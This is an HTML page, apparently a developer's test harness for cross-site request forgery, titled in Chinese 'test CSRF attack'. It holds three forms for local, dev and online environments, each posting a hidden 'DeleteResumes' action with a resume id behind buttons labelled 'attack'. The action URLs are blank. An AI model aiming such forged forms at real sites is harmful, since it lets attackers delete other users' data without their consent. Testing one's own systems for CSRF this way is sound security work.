<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport"
          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>测试SCRF攻击</title>
</head>
<body>
<h2>测试本地</h2>
<form action="" method="post">
    <input hidden type="text" name="action" value="DeleteResumes">
    <input type="text" name="id" value="2574041">
    <input type="submit" value="attack local">
</form>
<h2>测试线下</h2>
<form action="" method="post">
    <input hidden type="text" name="action" value="DeleteResumes">
    <input type="text" name="id" value="2574041">
    <input type="submit" value="attack dev">
</form>
<h2>测试线上</h2>
<form action="" method="post">
    <input hidden type="text" name="action" value="DeleteResumes">
    <input type="text" name="id" value="2574041">
    <input type="submit" value="attack online">
</form>
</body>
</html>
